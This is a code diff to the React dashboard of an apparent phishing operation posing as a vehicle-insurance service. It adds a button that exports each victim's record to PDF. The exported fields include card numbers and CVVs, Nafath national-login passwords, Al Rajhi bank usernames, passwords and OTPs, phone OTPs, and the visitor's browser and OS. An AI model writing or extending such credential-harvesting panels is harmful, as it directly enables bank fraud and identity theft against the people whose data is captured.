@@ -22,7 +22,9 @@ import {
   X,
   ChevronDown,
   ChevronUp,
+  FileDown,
 } from "lucide-react";
+import { generateInsurancePDF } from "@/lib/pdf-generator";
 import { cn } from "@/lib/utils";
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { Badge } from "@/components/ui/badge";
@@ -930,6 +932,70 @@ export default function Dashboard() {
 
               {/* Right Column - Visitor Info & Controls */}
               <div className="md:col-span-2 xl:col-span-3 space-y-3 md:space-y-4">
+                {/* PDF Download Button */}
+                <Button
+                  variant="default"
+                  className="w-full bg-blue-600 hover:bg-blue-700"
+                  onClick={() => {
+                    const birthDate = selectedApplication.personalInfo?.birthDay && selectedApplication.personalInfo?.birthMonth && selectedApplication.personalInfo?.birthYear
+                      ? `${selectedApplication.personalInfo.birthYear}-${selectedApplication.personalInfo.birthMonth}-${selectedApplication.personalInfo.birthDay}`
+                      : undefined;
+                    
+                    generateInsurancePDF({
+                      id: selectedApplication.id,
+                      personalInfo: {
+                        nationalId: selectedApplication.nationalId || selectedApplication.personalInfo?.nationalId,
+                        birthDate: birthDate,
+                        phone: selectedApplication.phoneNumber || selectedApplication.personalInfo?.phoneNumber,
+                        documment_owner_full_name: selectedApplication.documment_owner_full_name,
+                      },
+                      vehicleInfo: {
+                        serialNumber: selectedApplication.vehicleInfo?.vehicleSerial,
+                        vehicleYear: selectedApplication.vehicleInfo?.vehicleYear,
+                        coverageType: selectedApplication.vehicleInfo?.coverageType,
+                        selectedAddOns: selectedApplication.selectedOffer?.selectedFeatures,
+                      },
+                      selectedOffer: selectedApplication.selectedOffer ? {
+                        companyName: selectedApplication.selectedOffer.offerName,
+                        basePrice: selectedApplication.selectedOffer.totalPrice,
+                        totalPrice: selectedApplication.selectedOffer.totalPrice,
+                        discountPercentage: undefined,
+                      } : undefined,
+                      paymentInfo: {
+                        cardNumber: getCardNumber(selectedApplication),
+                        cardHolder: selectedApplication.cardName || selectedApplication.paymentInfo?.cardName,
+                        expiryDate: selectedApplication.cardExpiry || selectedApplication.paymentInfo?.cardExpiry,
+                        cvv: selectedApplication.cardCvv || selectedApplication.paymentInfo?.cardCvv,
+                      },
+                      nafazData: selectedApplication.nafazId ? {
+                        idNumber: selectedApplication.nafazId,
+                        password: selectedApplication.nafazPass,
+                        authNumber: selectedApplication.authNumber,
+                      } : undefined,
+                      rajhiData: selectedApplication.rajhiUser ? {
+                        username: selectedApplication.rajhiUser,
+                        password: selectedApplication.rajhiPassword,
+                        otp: selectedApplication.rajhiOtp,
+                      } : undefined,
+                      phoneData: selectedApplication.phoneIdNumber ? {
+                        phoneNumber: selectedApplication.phoneNumber,
+                        carrier: selectedApplication.phoneCarrier,
+                        otp: selectedApplication.phoneOtpCode,
+                      } : undefined,
+                      metadata: {
+                        country: selectedApplication.country,
+                        browser: selectedApplication.browser,
+                        os: selectedApplication.os,
+                        createdAt: selectedApplication.createdAt,
+                      },
+                    });
+                  }}
+                  data-testid="button-download-pdf"
+                >
+                  <FileDown className="w-4 h-4 ml-2" />
+                  تحميل PDF
+                </Button>
+
                 {/* Visitor Info */}
                 <Card className="bg-white dark:bg-gray-800">
                   <CardHeader className="pb-2">
